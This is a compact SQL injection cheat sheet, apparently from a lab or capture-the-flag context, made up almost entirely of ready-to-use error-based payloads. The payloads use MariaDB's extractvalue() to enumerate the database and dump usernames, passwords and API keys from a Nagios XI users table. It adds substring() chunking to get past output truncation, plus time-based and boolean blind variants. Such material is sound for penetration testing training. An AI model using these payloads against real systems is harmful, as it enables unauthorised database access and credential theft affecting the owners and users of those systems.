

### Confirm Error-Based Works First
```bash
# Trigger a visible error
' AND extractvalue(1,concat(0x7e,version()))-- -

# If that works you'll see something like:
# XPATH syntax error: '~10.5.19-MariaDB'
```

### Extract Current DB / User
```bash
# Database name
' AND extractvalue(1,concat(0x7e,database()))-- -

# Current user
' AND extractvalue(1,concat(0x7e,user()))-- -
```

### Enumerate Tables
```bash
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- -

# Increment LIMIT 1,1 / 2,1 etc to walk through tables
```

### Extract Data from a Table
```bash
' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))-- -
```

### Dump the Actual Data

```bash
# Get first username
' AND extractvalue(1,concat(0x7e,(SELECT username FROM xi_users LIMIT 0,1)))

# Get first password
' AND extractvalue(1,concat(0x7e,(SELECT password FROM xi_users LIMIT 0,1)))

# Get API key (huge value in Nagios XI)
' AND extractvalue(1,concat(0x7e,(SELECT api_key FROM xi_users LIMIT 0,1)))
```

The `extractvalue()` output is truncated at 32 chars. Fix it with `substring()` to get the rest:

```bash
# First 32 chars (what you already have)
' AND extractvalue(1,concat(0x7e,(SELECT substring(api_key,1,32) FROM xi_users LIMIT 0,1)))

# Next chunk
' AND extractvalue(1,concat(0x7e,(SELECT substring(api_key,33,32) FROM xi_users LIMIT 0,1)))

# If still more
' AND extractvalue(1,concat(0x7e,(SELECT substring(api_key,65,32) FROM xi_users LIMIT 0,1)))
```

### If It's Blind (No Error Output Visible)
Use time-based to confirm:
```bash
' AND SLEEP(5)-- -
```

Boolean-based to extract char by char:
```bash
' AND SUBSTRING(database(),1,1)='a'-- -
```
